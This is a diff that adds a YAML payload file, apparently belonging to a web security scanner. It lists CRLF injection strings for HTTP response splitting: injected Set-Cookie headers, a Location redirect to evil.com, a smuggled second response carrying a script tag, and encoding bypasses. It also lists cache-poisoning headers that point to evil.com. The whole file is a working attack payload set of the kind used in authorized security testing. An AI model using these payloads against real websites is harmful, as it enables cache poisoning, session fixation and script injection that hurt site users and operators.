@@ -1,0 +1,21 @@
+# payloads/crlf.yml
+# Advanced HTTP Response Splitting, Cache Poisoning, and Unicode normalizations
+
+response_splitting:
+  - "%0d%0aSet-Cookie:crlf=injection"
+  - "%0D%0ASet-Cookie:crlf=injection"
+  - "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection" # Unicode overlong encoding bypass
+  - "%23%0d%0aSet-Cookie:crlf=injection"
+  - "%25%30%61Set-Cookie:crlf=injection"          # Double URL encoding
+  - "%0d%0aLocation:%20http://evil.com"
+  - "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>"
+
+cache_poison_headers:
+  - {"X-Forwarded-Host": "evil.com"}
+  - {"X-Rewrite-URL": "/evil.com"}
+  - {"X-Original-URL": "/evil.com"}
+  - {"X-Host": "evil.com"}
+  - {"X-Forwarded-Server": "evil.com"}
+  - {"X-HTTP-Host-Override": "evil.com"}
+  - {"Base-Url": "evil.com"}
+  - {"Uri": "evil.com"}
